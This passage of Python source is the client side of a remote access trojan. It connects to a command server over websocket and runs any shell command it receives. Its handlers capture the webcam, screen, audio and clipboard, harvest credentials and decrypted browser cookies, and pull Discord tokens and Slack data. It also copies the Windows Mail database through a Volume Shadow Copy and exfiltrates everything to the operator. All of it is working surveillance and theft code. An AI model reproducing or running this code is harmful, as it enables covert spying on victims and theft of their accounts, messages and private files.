                mail_folders = []
                for root, dirs, files in os.walk(tb_path):
                    for file in files:
                        if file.endswith('.msf') or file.endswith('.mab'):
                            continue  # Skip index files
                        
                        # Check for mail folders (files without extension in Mail dir)
                        if 'Mail' in root and '.' not in file:
                            file_path = os.path.join(root, file)
                            try:
                                size = os.path.getsize(file_path)
                                mail_folders.append({
                                    'folder': file,
                                    'path': file_path,
                                    'size': size
                                })
                            except:
                                pass
                
                results['mail_folders'] = mail_folders
                results['count'] = len(mail_folders)
                results['note'] = 'Mail folders found - use download to retrieve mbox files'
            else:
                results['error'] = 'Thunderbird not found'
        
        elif msg_type == 'discord':
            # Extract Discord tokens and data
            discord_paths = []
            
            if os_type == 'Windows':
                discord_paths = [
                    os.path.expandvars(r'%APPDATA%\Discord\Local Storage\leveldb'),
                    os.path.expandvars(r'%APPDATA%\discordcanary\Local Storage\leveldb'),
                    os.path.expandvars(r'%APPDATA%\discordptb\Local Storage\leveldb'),
                ]
            elif os_type == 'Linux':
                discord_paths = [
                    os.path.expanduser('~/.config/discord/Local Storage/leveldb'),
                    os.path.expanduser('~/.config/discordcanary/Local Storage/leveldb'),
                ]
            elif os_type == 'Darwin':
                discord_paths = [
                    os.path.expanduser('~/Library/Application Support/discord/Local Storage/leveldb'),
                ]
            
            tokens_found = []
            for discord_path in discord_paths:
                if os.path.exists(discord_path):
                    for file in os.listdir(discord_path):
                        if file.endswith('.ldb') or file.endswith('.log'):
                            file_path = os.path.join(discord_path, file)
                            try:
                                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                    content = f.read()
                                    # Look for Discord tokens (simplified pattern)
                                    import re
                                    tokens = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', content)
                                    if tokens:
                                        tokens_found.extend(tokens)
                            except:
                                pass
            
            results['discord'] = {
                'tokens_found': len(tokens_found),
                'tokens': list(set(tokens_found))[:5],  # First 5 unique tokens
                'note': 'Discord tokens found in Local Storage' if tokens_found else 'No tokens found'
            }
        
        elif msg_type == 'slack':
            # Extract Slack tokens and workspaces
            slack_paths = []
            
            if os_type == 'Windows':
                slack_paths = [
                    os.path.expandvars(r'%APPDATA%\Slack\storage'),
                    os.path.expandvars(r'%APPDATA%\Slack\Cookies'),
                ]
            elif os_type == 'Linux':
                slack_paths = [
                    os.path.expanduser('~/.config/Slack/storage'),
                    os.path.expanduser('~/.config/Slack/Cookies'),
                ]
            elif os_type == 'Darwin':
                slack_paths = [
                    os.path.expanduser('~/Library/Application Support/Slack/storage'),
                    os.path.expanduser('~/Library/Application Support/Slack/Cookies'),
                ]
            
            workspaces = []
            for slack_path in slack_paths:
                if os.path.exists(slack_path):
                    workspaces.append({
                        'path': slack_path,
                        'note': 'Slack data found - contains tokens and workspace info'
                    })
            
            results['slack'] = {
                'workspaces_found': len(workspaces),
                'data_locations': workspaces
            }
        
        elif msg_type == 'windows_mail_export':
            # Export Windows Mail database using Volume Shadow Copy to bypass locks
            if os_type != 'Windows':
                results['error'] = 'Windows Mail export only available on Windows'
            else:
                import zipfile
                import subprocess
                import tempfile
                from datetime import datetime
                import re
                
                mail_path = os.path.expandvars(r'%LOCALAPPDATA%\Comms\UnistoreDB')
                
                if not os.path.exists(mail_path):
                    results['error'] = 'Windows Mail database not found'
                    results['path'] = mail_path
                else:
                    # Ensure downloads directory exists
                    ensure_download_dir()
                    
                    # Create ZIP file
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    zip_filename = f"windows_mail_export_{timestamp}.zip"
                    zip_path = Path(DOWNLOAD_DIR) / zip_filename
                    
                    shadow_id = None
                    shadow_path = None
                    temp_copy_dir = None
                    
                    try:
                        # Step 1: Create Volume Shadow Copy using PowerShell (works on Win10/11)
                        print("[VSS] Creating shadow copy via PowerShell...")
                        
                        # Get the drive letter from mail_path
                        drive_letter = os.path.splitdrive(mail_path)[0]
                        
                        # PowerShell script to create shadow copy
                        ps_script = f'''
$class = [WMICLASS]"root\\cimv2:win32_shadowcopy";
$result = $class.create("{drive_letter}\\", "ClientAccessible");
if ($result.ReturnValue -eq 0) {{
    $shadowID = $result.ShadowID;
    $shadow = Get-WmiObject Win32_ShadowCopy | Where-Object {{ $_.ID -eq $shadowID }};
    Write-Output "SHADOW_PATH:$($shadow.DeviceObject)";
    Write-Output "SHADOW_ID:$($shadow.ID)";
}} else {{
    Write-Error "Failed to create shadow copy. Return code: $($result.ReturnValue)";
    exit 1;
}}
'''
                        
                        # Execute PowerShell script
                        vss_create = subprocess.run(
                            ['powershell', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', ps_script],
                            capture_output=True,
                            text=True,
                            timeout=30
                        )
                        
                        # Capture output for debugging
                        output = vss_create.stdout
                        error_output = vss_create.stderr
                        
                        print(f"[VSS] PowerShell stdout: {output}")
                        print(f"[VSS] PowerShell stderr: {error_output}")
                        print(f"[VSS] PowerShell return code: {vss_create.returncode}")
                        
                        if vss_create.returncode != 0:
                            error_msg = error_output if error_output else output
                            raise Exception(f"PowerShell VSS creation failed: {error_msg}")
                        
                        # Parse shadow path and ID from output
                        shadow_match = re.search(r'SHADOW_PATH:(.*)', output)
                        id_match = re.search(r'SHADOW_ID:(.*)', output)
                        
                        if not shadow_match:
                            raise Exception(f"Could not parse shadow path from output: {output}")
                        
                        shadow_path = shadow_match.group(1).strip()
                        shadow_id = id_match.group(1).strip() if id_match else None
                        
                        print(f"[VSS] Shadow copy created: {shadow_path}")
                        print(f"[VSS] Shadow ID: {shadow_id}")
                        
                        # Step 2: Copy files from shadow to temp directory
                        print("[VSS] Copying files from shadow...")
                        
                        # Create temp directory for copied files
                        temp_copy_dir = os.path.join(tempfile.gettempdir(), f'mail_vss_{os.getpid()}')
                        os.makedirs(temp_copy_dir, exist_ok=True)
                        
                        # Build source path from shadow copy
                        # Remove drive letter from original path and add to shadow path
                        # Example: C:\Users\... becomes \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\Users\...
                        drive_letter_with_colon = os.path.splitdrive(mail_path)[0]  # "C:"
                        relative_path = mail_path.replace(drive_letter_with_colon + '\\', '')  # Remove "C:\"
                        
                        # Ensure shadow_path ends with backslash and relative_path doesn't start with one
                        if not shadow_path.endswith('\\'):
                            shadow_path = shadow_path + '\\'
                        
                        shadow_source = shadow_path + relative_path
                        
                        print(f"[VSS] Shadow source: {shadow_source}")
                        print(f"[VSS] Temp destination: {temp_copy_dir}")
                        
                        # Create a symbolic link to the shadow copy (mklink works with VSS paths)
                        shadow_link = os.path.join(tempfile.gettempdir(), f'shadow_link_{os.getpid()}')
                        
                        try:
                            # Create symbolic link: mklink /D <link> <target>
                            mklink_result = subprocess.run(
                                ['cmd', '/c', 'mklink', '/D', shadow_link, shadow_path.rstrip('\\')],
                                capture_output=True,
                                text=True,
                                timeout=10
                            )
                            
                            print(f"[VSS] mklink return code: {mklink_result.returncode}")
                            print(f"[VSS] mklink output: {mklink_result.stdout}")
                            
                            if mklink_result.returncode != 0:
                                raise Exception(f"Failed to create symbolic link: {mklink_result.stderr}")
                            
                            # Now use the symbolic link to access the shadow
                            # Build the source path using the link
                            link_source = os.path.join(shadow_link, relative_path)
                            
                            print(f"[VSS] Copying from link: {link_source}")
                            
                            # Use robocopy with the link
                            copy_result = subprocess.run(
                                ['robocopy', link_source, temp_copy_dir, '/E', '/COPYALL', '/R:0', '/W:0'],
                                capture_output=True,
                                text=True,
                                timeout=60
                            )
                            
                            print(f"[VSS] robocopy return code: {copy_result.returncode}")
                            
                            # Robocopy exit codes: 0-7 are success, 8+ are errors
                            if copy_result.returncode >= 8:
                                print(f"[VSS] robocopy stdout: {copy_result.stdout}")
                                raise Exception(f"robocopy failed (code {copy_result.returncode}): {copy_result.stderr}")
                            
                            print(f"[VSS] Files copied successfully")
                            
                        finally:
                            # Remove the symbolic link
                            try:
                                if os.path.exists(shadow_link):
                                    subprocess.run(['cmd', '/c', 'rmdir', shadow_link], timeout=5)
                                    print(f"[VSS] Removed symbolic link")
                            except:
                                pass
                        
                        print(f"[VSS] Files copied to: {temp_copy_dir}")
                        
                        # Step 3: Create ZIP from copied files
                        print("[VSS] Creating ZIP archive...")
                        
                        file_count = 0
                        total_size = 0
                        
                        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                            for root, dirs, files in os.walk(temp_copy_dir):
                                for file in files:
                                    file_path = os.path.join(root, file)
                                    arcname = os.path.relpath(file_path, temp_copy_dir)
                                    
                                    try:
                                        zipf.write(file_path, arcname)
                                        file_count += 1
                                        total_size += os.path.getsize(file_path)
                                    except Exception as e:
                                        print(f"[VSS] Warning: Could not add {file} to ZIP: {e}")
                        
                        zip_size = zip_path.stat().st_size
                        
                        results['success'] = True
                        results['method'] = 'Volume Shadow Copy (VSS)'
                        results['zip_file'] = str(zip_path)
                        results['filename'] = zip_filename
                        results['files_archived'] = file_count
                        results['original_size_mb'] = round(total_size / (1024 * 1024), 2)
                        results['zip_size_mb'] = round(zip_size / (1024 * 1024), 2)
                        results['compression_ratio'] = round((1 - zip_size / total_size) * 100, 1) if total_size > 0 else 0
                        
                        print(f"[VSS] Export complete: {file_count} files, {results['zip_size_mb']} MB")
                        
                    except Exception as e:
                        results['error'] = f'VSS export failed: {str(e)}'
                        
                    finally:
                        # Step 4: Cleanup - Delete shadow copy
                        if shadow_id:
                            try:
                                print(f"[VSS] Deleting shadow copy {shadow_id}...")
                                
                                # Use PowerShell WMI to delete
                                ps_delete = f'(Get-WmiObject Win32_ShadowCopy | Where-Object {{ $_.ID -eq "{shadow_id}" }}).Delete()'
                                
                                subprocess.run(
                                    ['powershell', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', ps_delete],
                                    capture_output=True,
                                    timeout=10
                                )
                                print(f"[VSS] Shadow copy deleted")
                            except Exception as e:
                                print(f"[VSS] Warning: Could not delete shadow copy: {e}")
                        
                        # Delete temp directory
                        if temp_copy_dir and os.path.exists(temp_copy_dir):
                            try:
                                import shutil
                                shutil.rmtree(temp_copy_dir)
                                print(f"[VSS] Cleaned up temp directory")
                            except:
                                pass
        
        results_json = json.dumps(results, indent=2)
        return f"MSG_DATA:{msg_type}:{results_json}"
    
    except Exception as e:
        return f"MSG_ERROR:{str(e)}"

# ============ NEW FEATURE 10: Remote Shell Upgrading ============
async def upgrade_shell(upgrade_type: str) -> str:
    """
    Upgrade the remote shell to various types
    upgrade_type: 'powershell', 'bash', 'zsh', 'python', 'pty'
    Return format: SHELL_UPGRADE:type:status or SHELL_ERROR:message
    """
    try:
        import platform
        import subprocess
        
        os_type = platform.system()
        
        if upgrade_type == 'powershell':
            if os_type == 'Windows':
                # Check if PowerShell is available
                try:
                    result = subprocess.run(['powershell', '-Command', 'echo PowerShell Available'], 
                                          capture_output=True, text=True, timeout=5)
                    if result.returncode == 0:
                        return "SHELL_UPGRADE:powershell:PowerShell available - use 'powershell -Command <cmd>' for PowerShell commands"
                    else:
                        return "SHELL_ERROR:PowerShell not accessible"
                except:
                    return "SHELL_ERROR:PowerShell not found"
            else:
                return "SHELL_ERROR:PowerShell only available on Windows"
        
        elif upgrade_type == 'bash':
            if os_type in ['Linux', 'Darwin']:
                try:
                    result = subprocess.run(['bash', '--version'], 
                                          capture_output=True, text=True, timeout=5)
                    if result.returncode == 0:
                        return "SHELL_UPGRADE:bash:Bash available - shell commands will use bash"
                    else:
                        return "SHELL_ERROR:Bash not accessible"
                except:
                    return "SHELL_ERROR:Bash not found"
            else:
                return "SHELL_ERROR:Bash not available on Windows"
        
        elif upgrade_type == 'zsh':
            if os_type in ['Linux', 'Darwin']:
                try:
                    result = subprocess.run(['zsh', '--version'], 
                                          capture_output=True, text=True, timeout=5)
                    if result.returncode == 0:
                        return "SHELL_UPGRADE:zsh:Zsh available - use 'zsh -c <cmd>' for zsh commands"
                    else:
                        return "SHELL_ERROR:Zsh not accessible"
                except:
                    return "SHELL_ERROR:Zsh not installed"
            else:
                return "SHELL_ERROR:Zsh not available on Windows"
        
        elif upgrade_type == 'python':
            # Check Python availability and version
            try:
                import sys
                python_version = sys.version
                python_path = sys.executable
                return f"SHELL_UPGRADE:python:Python {python_version} available at {python_path} - use 'python -c <code>' for Python commands"
            except:
                return "SHELL_ERROR:Python information unavailable"
        
        elif upgrade_type == 'pty':
            if os_type in ['Linux', 'Darwin']:
                # PTY upgrade for better shell (bash with terminal capabilities)
                try:
                    import pty
                    return "SHELL_UPGRADE:pty:PTY module available - full TTY shell upgrade possible (not implemented in this version)"
                except ImportError:
                    return "SHELL_ERROR:PTY module not available"
            else:
                return "SHELL_ERROR:PTY only available on Unix-like systems"
        
        else:
            return f"SHELL_ERROR:Unknown upgrade type: {upgrade_type}"
    
    except Exception as e:
        return f"SHELL_ERROR:{str(e)}"

async def run_command(command):
    """Runs a shell command with a timeout"""
    try:
        proc = await asyncio.wait_for(
            asyncio.create_subprocess_shell(
                command,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            ),
            timeout=30.0
        )
        
        stdout, stderr = await proc.communicate()
        output = (stdout + stderr).decode()
        
        return output if output else "(no output)"
    
    except asyncio.TimeoutError:
        return "[ERROR] Command timeout (30s limit)"
    except Exception as e:
        return f"[ERROR] {e}"

async def main():
    # Configuration
    if AUTO_LOGIN and AUTO_PASSWORD:
        # Automatic mode - no interaction
        server_host = SERVER_HOST
        server_port = str(SERVER_PORT)
        login = AUTO_LOGIN
        password = AUTO_PASSWORD
        print(f"[+] Auto-connecting to {server_host}:{server_port} as {login}")
    else:
        # Interactive mode - request information
        server_host = input(f"Server host [{SERVER_HOST}]: ").strip() or SERVER_HOST
        server_port = input(f"Server port [{SERVER_PORT}]: ").strip() or str(SERVER_PORT)
        
        print("\n--- Authentication ---")
        login = input("Login: ").strip()
        password = getpass.getpass("Password: ")
        
        if not login or not password:
            print("[ERROR] Login and password are required")
            sys.exit(1)
    
    uri = f"wss://{server_host}:{server_port}"
    
    ssl_context = ssl._create_unverified_context()
    
    max_retries = 5
    
    for attempt in range(max_retries):
        try:
            async with websockets.connect(
                uri,
                ssl=ssl_context,
                ping_interval=None,
                max_size=10_000_000  # 10MB pour les fichiers
            ) as websocket:
                
                # Authentication
                auth_message = f"target:{TARGET_ID}::{login}::{password}"
                await websocket.send(auth_message)
                
                # Wait for authentication response
                response = await asyncio.wait_for(websocket.recv(), timeout=10.0)
                print(f"[SERVER] {response}")
                
                if "Authentication successful" not in response:
                    print("[!] Authentication failed")
                    return
                
                print("[+] Target agent ready. Waiting for commands...")
                
                # Main command loop
                while True:
                    try:
                        command = await websocket.recv()
                        
                        if command.startswith("DOWNLOAD:"):
                            # Format: DOWNLOAD:filepath
                            filepath = command.split(":", 1)[1]
                            print(f"[DOWNLOAD] {filepath}")
                            response = await handle_file_get(filepath)
                            await websocket.send(response)
                        
                        elif command.startswith("UPLOAD:"):
                            # Format: UPLOAD:filename:base64_data
                            parts = command.split(":", 2)
                            if len(parts) == 3:
                                _, filename, b64_data = parts
                                print(f"[UPLOAD] {filename}")
                                response = await handle_file_put(filename, b64_data)
                                await websocket.send(response)
                            else:
                                await websocket.send("FILE_ERROR:Invalid upload format")
                        
                        elif command == "LIST_DOWNLOADS":
                            # List files in downloads directory
                            print(f"[LIST] Downloads directory")
                            try:
                                script_dir = Path(__file__).parent if '__file__' in globals() else Path.cwd()
                                downloads_path = script_dir / DOWNLOAD_DIR
                                
                                if downloads_path.exists() and downloads_path.is_dir():
                                    files = list(downloads_path.iterdir())
                                    if files:
                                        file_list = []
                                        for f in files:
                                            if f.is_file():
                                                size_kb = f.stat().st_size / 1024
                                                file_list.append(f"  - {f.name} ({size_kb:.2f} KB)")
                                        
                                        if file_list:
                                            response = f"LIST_DOWNLOADS_OK:Files in downloads/ directory:\n" + "\n".join(file_list)
                                            response += f"\n\n💡 Download with: download {files[-1].name if files else 'filename'}"
                                        else:
                                            response = "LIST_DOWNLOADS_OK:downloads/ directory is empty"
                                    else:
                                        response = "LIST_DOWNLOADS_OK:downloads/ directory is empty"
                                else:
                                    response = f"LIST_DOWNLOADS_ERROR:downloads/ directory not found at: {downloads_path}"
                                
                                await websocket.send(response)
                            except Exception as e:
                                await websocket.send(f"LIST_DOWNLOADS_ERROR:Error listing downloads: {str(e)}")
                        
                        elif command == "WEBCAM_CAPTURE":
                            print(f"[WEBCAM] Capturing...")
                            response = await capture_webcam()
                            await websocket.send(response)
                        
                        elif command == "SCREENSHOT":
                            print(f"[SCREENSHOT] Capturing desktop...")
                            response = await capture_screenshot()
                            await websocket.send(response)
                        
                        elif command == "STREAM_START":
                            print(f"[STREAM] Starting desktop stream...")
                            response = await desktop_streamer.start_stream(websocket)
                            await websocket.send(response)
                        
                        elif command == "STREAM_STOP":
                            print(f"[STREAM] Stopping desktop stream...")
                            response = await desktop_streamer.stop_stream()
                            await websocket.send(response)
                        
                        elif command.startswith("RECORD_AUDIO:"):
                            # Format: RECORD_AUDIO:duration
                            duration_str = command.split(":", 1)[1]
                            try:
                                duration = int(duration_str)
                                print(f"[RECORD] Recording {duration}s...")
                                response = await record_audio(duration)
                                await websocket.send(response)
                            except ValueError:
                                await websocket.send("AUDIO_ERROR:Invalid duration format")
                        
                        elif command.startswith("SEARCH_FILES:"):
                            # Format: SEARCH_FILES:pattern or SEARCH_FILES:pattern:max_results
                            parts = command.split(":")
                            if len(parts) == 2:
                                _, pattern = parts
                                print(f"[SEARCH] Searching files: {pattern}")
                                response = await search_files(pattern, False, "", 100)
                                await websocket.send(response)
                            elif len(parts) == 3:
                                _, pattern, max_results = parts
                                try:
                                    max_res = int(max_results)
                                    print(f"[SEARCH] Searching files: {pattern} (max {max_res})")
                                    response = await search_files(pattern, False, "", max_res)
                                    await websocket.send(response)
                                except ValueError:
                                    await websocket.send("SEARCH_ERROR:Invalid max_results format")
                            else:
                                await websocket.send("SEARCH_ERROR:Invalid search format")
                        
                        elif command.startswith("SEARCH_CONTENT:"):
                            # Format: SEARCH_CONTENT:pattern:content or SEARCH_CONTENT:pattern:content:max_results
                            parts = command.split(":")
                            if len(parts) == 3:
                                _, pattern, content = parts
                                print(f"[SEARCH] Searching content: {content}")
                                response = await search_files("*", True, content, 100)
                                await websocket.send(response)
                            elif len(parts) == 4:
                                # SEARCH_CONTENT:pattern:content:max_results
                                _, pattern, content, max_results = parts
                                try:
                                    max_res = int(max_results)
                                    print(f"[SEARCH] Searching content: {content} (max {max_res})")
                                    response = await search_files("*", True, content, max_res)
                                    await websocket.send(response)
                                except ValueError:
                                    await websocket.send("SEARCH_ERROR:Invalid max_results format")
                            else:
                                await websocket.send("SEARCH_ERROR:Invalid search format")
                        
                        elif command == "SYSINFO_GATHER":
                            print(f"[SYSINFO] Gathering system information...")
                            response = await gather_sysinfo()
                            await websocket.send(response)
                        
                        elif command.startswith("CLIPBOARD:"):
                            # Format: CLIPBOARD:get or CLIPBOARD:set:base64_content
                            action = command.split(":", 1)[1]
                            print(f"[CLIPBOARD] Action: {action[:20]}...")
                            response = await monitor_clipboard(action)
                            await websocket.send(response)
                        
                        elif command.startswith("CLIPBOARD_MONITOR:"):
                            # Format: CLIPBOARD_MONITOR:duration (in seconds)
                            parts = command.split(":")
                            
                            # Duration is REQUIRED - reject if missing or 0
                            if len(parts) < 2 or not parts[1] or parts[1] == "0":
                                await websocket.send("CLIPBOARD_MONITOR_ERROR:Duration required. Usage: clipboard monitor <seconds>")
                                print(f"[CLIPBOARD_MONITOR] Error: Duration required")
                                continue
                            
                            try:
                                duration = int(parts[1])
                                if duration <= 0:
                                    await websocket.send("CLIPBOARD_MONITOR_ERROR:Duration must be positive. Usage: clipboard monitor <seconds>")
                                    print(f"[CLIPBOARD_MONITOR] Error: Duration must be positive")
                                    continue
                            except ValueError:
                                await websocket.send("CLIPBOARD_MONITOR_ERROR:Invalid duration. Usage: clipboard monitor <seconds>")
                                print(f"[CLIPBOARD_MONITOR] Error: Invalid duration")
                                continue
                            
                            print(f"[CLIPBOARD_MONITOR] Starting... (duration: {duration}s)")
                            
                            # Launch monitoring as background task (non-blocking)
                            clipboard_task = asyncio.create_task(start_clipboard_monitor(websocket, duration))
                            # Store task reference so it can be cancelled if needed
                            if not hasattr(websocket, '_clipboard_task'):
                                websocket._clipboard_task = None
                            websocket._clipboard_task = clipboard_task
                            
                            # Immediately return to command loop - task runs in background
                            print(f"[CLIPBOARD_MONITOR] Background task launched, target remains responsive")
                        
                        elif command == "STOP_CLIPBOARD_MONITOR":
                            # Stop clipboard monitoring if running
                            print(f"[CLIPBOARD_MONITOR] Stop signal received")
                            if hasattr(websocket, '_clipboard_task') and websocket._clipboard_task:
                                websocket._clipboard_task.cancel()
                                try:
                                    await websocket._clipboard_task
                                except asyncio.CancelledError:
                                    pass
                                websocket._clipboard_task = None
                                await websocket.send("CLIPBOARD_MONITOR_STOP:Monitoring stopped by user")
                            else:
                                await websocket.send("CLIPBOARD_MONITOR_ERROR:No monitoring session active")
                        
                        elif command.startswith("CLIPBOARD_HISTORY:"):
                            # Format: CLIPBOARD_HISTORY:since_index
                            # Returns new clipboard entries since the given index
                            try:
                                global clipboard_history
                                parts = command.split(":", 1)
                                since_index = int(parts[1]) if len(parts) > 1 else 0
                                
                                print(f"[CLIPBOARD_HISTORY] Request from index {since_index}, history size: {len(clipboard_history)}")
                                
                                # Get new entries since index
                                new_entries = clipboard_history[since_index:]
                                
                                if new_entries:
                                    # Send each entry
                                    for entry in new_entries:
                                        timestamp = entry['timestamp']
                                        b64_content = entry['b64_content']
                                        message = f"CLIPBOARD_HISTORY_ENTRY:{timestamp}:{b64_content}"
                                        await websocket.send(message)
                                        print(f"[CLIPBOARD_HISTORY] Sent entry: {timestamp}")
                                    
                                    # Send completion with new index
                                    new_index = len(clipboard_history)
                                    await websocket.send(f"CLIPBOARD_HISTORY_COMPLETE:{new_index}")
                                    print(f"[CLIPBOARD_HISTORY] Complete, new index: {new_index}")
                                else:
                                    # No new entries
                                    await websocket.send(f"CLIPBOARD_HISTORY_COMPLETE:{since_index}")
                                    print(f"[CLIPBOARD_HISTORY] No new entries")
                            
                            except Exception as e:
                                print(f"[CLIPBOARD_HISTORY] Error: {e}")
                                await websocket.send(f"CLIPBOARD_HISTORY_ERROR:{str(e)}")
                        
                        elif command.startswith("CREDS:"):
                            # Format: CREDS:type (wifi, browsers, applications, windows)
                            cred_type = command.split(":", 1)[1]
                            print(f"[CREDS] Harvesting: {cred_type}")
                            response = await harvest_credentials(cred_type)
                            await websocket.send(response)
                        
                        # ======== NEW FEATURE COMMANDS ========
                        
                        elif command == "BROWSER_DEBUG":
                            # Debug command to show browser paths
                            print(f"[BROWSER] Debug - checking browser paths...")
                            try:
                                import platform
                                import tempfile
                                
                                os_type = platform.system()
                                temp_dir = tempfile.gettempdir()
                                
                                debug_info = {
                                    'os': os_type,
                                    'temp_dir': temp_dir,
                                    'browsers': {}
                                }
                                
                                if os_type == 'Windows':
                                    paths_to_check = {
                                        'chrome_history': os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\History'),
                                        'chrome_cookies': os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies'),
                                        'edge_history': os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\History'),
                                        'edge_cookies': os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Network\Cookies'),
                                        'firefox_base': os.path.expandvars(r'%APPDATA%\Mozilla\Firefox\Profiles')
                                    }
                                    
                                    for name, path in paths_to_check.items():
                                        exists = os.path.exists(path)
                                        size = os.path.getsize(path) if exists and os.path.isfile(path) else 0
                                        debug_info['browsers'][name] = {
                                            'path': path,
                                            'exists': exists,
                                            'is_file': os.path.isfile(path) if exists else False,
                                            'is_dir': os.path.isdir(path) if exists else False,
                                            'size_kb': round(size / 1024, 2) if size > 0 else 0
                                        }
                                
                                import json
                                debug_json = json.dumps(debug_info, indent=2)
                                await websocket.send(f"BROWSER_DEBUG_DATA:{debug_json}")
                            except Exception as e:
                                await websocket.send(f"BROWSER_ERROR:Debug failed: {str(e)}")
                        
                        elif command.startswith("BROWSER_DATA:"):
                            # Format: BROWSER_DATA:type[:save] (history, cookies, bookmarks, downloads)
                            parts = command.split(":")
                            data_type = parts[1]
                            save_to_file = len(parts) > 2 and 'save' in parts[2]
                            
                            # Always decrypt cookies (seamlessly integrated)
                            decrypt_values = (data_type == 'cookies')
                            
                            print(f"[BROWSER] Extracting {data_type}... (save={save_to_file}, decrypt={decrypt_values})")
                            response = await extract_browser_data(data_type, save_to_file, decrypt_values)
                            await websocket.send(response)
                        
                        elif command.startswith("EXFIL:"):
                            # Format: EXFIL:mode or EXFIL:mode:args
                            parts = command.split(":", 2)
                            mode = parts[1]
                            args = parts[2] if len(parts) > 2 else ""
                            print(f"[EXFIL] Mode: {mode}")
                            response = await smart_exfiltrate(mode, args)
                            await websocket.send(response)
                        
                        elif command.startswith("MSG:"):
                            # Format: MSG:type (email_list, email_outlook, email_thunderbird, discord, slack)
                            msg_type = command.split(":", 1)[1]
                            print(f"[MSG] Extracting: {msg_type}")
                            response = await extract_messages(msg_type)
                            await websocket.send(response)
                        
                        elif command.startswith("SHELL_UPGRADE:"):
                            # Format: SHELL_UPGRADE:type (powershell, bash, zsh, python, pty)
                            upgrade_type = command.split(":", 1)[1]
                            print(f"[SHELL] Upgrading to: {upgrade_type}")
                            response = await upgrade_shell(upgrade_type)
                            await websocket.send(response)
                        
                        elif command.lower() in ("exit", "quit"):
                            print("[+] Exit command received")
                            break
                        
                        else:
                            # Standard shell command
                            print(f"[CMD] {command}")
                            result = await run_command(command)
                            await websocket.send(result)
                    
                    except websockets.exceptions.ConnectionClosed:
                        print("[!] Server disconnected")
                        raise
                
                # Clean exit
                return
        
        except websockets.exceptions.ConnectionClosed:
            if attempt < max_retries - 1:
                wait_time = 2 ** attempt
                print(f"[!] Connection lost. Retrying in {wait_time}s... ({attempt+1}/{max_retries})")
                await asyncio.sleep(wait_time)
            else:
                print("[!] Max retries reached. Exiting.")
                raise
        
        except Exception as e:
            print(f"[ERROR] {e}")
            if attempt < max_retries - 1:
                wait_time = 2 ** attempt
                print(f"[!] Retrying in {wait_time}s...")
                await asyncio.sleep(wait_time)
            else:
                raise

if __name__ == "__main__":
    asyncio.run(main())